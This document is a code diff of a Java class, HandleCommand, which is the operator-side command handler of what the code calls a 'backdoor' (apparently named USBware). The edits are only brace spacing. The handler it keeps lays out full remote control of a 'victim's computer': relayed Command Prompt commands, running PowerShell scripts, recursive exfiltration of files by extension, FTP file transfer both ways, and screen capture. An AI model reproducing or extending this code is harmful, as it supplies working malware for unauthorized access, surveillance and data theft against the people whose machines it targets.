@@ -12,9 +12,9 @@ public class HandleCommand {
 	 * @param command command given by user.
 	 */
 	public static void handle(String command) {
-		if(command.equals("cmd")) {
+		if(command.equals("cmd")){
 			System.out.println("Commands will now be run through vitim's computer's Command Prompt\nEnter 'back' to go back");
-			while(true) {
+			while(true){
 				System.out.print("cmd");
 				String cmdCommand=USBware.getInput("");
 				if(cmdCommand.equals("back"))
@@ -22,7 +22,7 @@ public class HandleCommand {
 				Shell.out.println("cmd "+cmdCommand);
 				System.out.println(getResp());
 			}
-		}else if(command.equals("ps")||command.equals("ds")) {
+		}else if(command.equals("ps") || command.equals("ds")){
 			if(command.equals("ps"))
 				Shell.out.println("cmd cd scripts && dir/b/a:-d *.ps1");
 			else if(command.equals("ds"))
@@ -33,7 +33,7 @@ public class HandleCommand {
 			scripts.remove("File Not Found");
 			if(scripts.size()==0)
 				System.out.println("No scripts found");
-			else {
+			else{
 				System.out.println("Chose script:");
 				for(String script:scripts)
 					System.out.println("-"+script);
@@ -41,7 +41,7 @@ public class HandleCommand {
 				Shell.out.println(command+" "+scriptName);
 				System.out.println(getResp());
 			}
-		}else if(command.equals("exfiles")) {
+		}else if(command.equals("exfiles")){
 			System.out.println("This will copy files with desired extensions from a folder and all it's subfolders to gathered\\ExfiltratedFiles relative to the backdoor executable");
 			System.out.println("Enter victim's directory to search through:");
 			String root=USBware.getInput("");
@@ -50,7 +50,7 @@ public class HandleCommand {
 			Shell.out.println("exfiles "+root+"*"+exts);
 			System.out.println("Exfiltrating...\n");
 			System.out.println(getResp());
-		}else if(command.equals("filesend")) {
+		}else if(command.equals("filesend")){
 			System.out.println("Enter local filepath of file to send:");
 			String fileSend=USBware.getInput("file");
 			System.out.println("Enter victim's filepath of file to receive:");
@@ -58,7 +58,7 @@ public class HandleCommand {
 			Shell.out.println("filesend "+fileRec);
 			FTP.shell(fileSend, "send");
 			System.out.println(getResp());
-		}else if(command.equals("filerec")) {
+		}else if(command.equals("filerec")){
 			System.out.println("Enter victim's filepath of file to send:");
 			String fileSend=USBware.getInput("");
 			System.out.println("Enter local filepath of file to receive:");
@@ -66,12 +66,12 @@ public class HandleCommand {
 			Shell.out.println("filerec "+fileSend);
 			FTP.shell(fileRec, "rec");
 			System.out.println(getResp());
-		}else if(command.equals("ss")) {
+		}else if(command.equals("ss")){
 			Shell.out.println("ss");
 			System.out.println("Receiving screenshot to '"+System.getProperty("user.dir")+"\\screenshot.png'...");
 			FTP.shell("screenshot.png", "rec");
 			System.out.println(getResp());
-		}else {
+		}else{
 			Shell.out.println(command);
 			System.out.println(getResp());
 		}
@@ -84,7 +84,7 @@ public class HandleCommand {
 	 */
 	private static String getResp() {
 		String resp="";
-		while(Shell.in.hasNextLine()) {
+		while(Shell.in.hasNextLine()){
 			String line=Shell.in.nextLine();
 			if(line.equals("!$end$!"))
 				break;
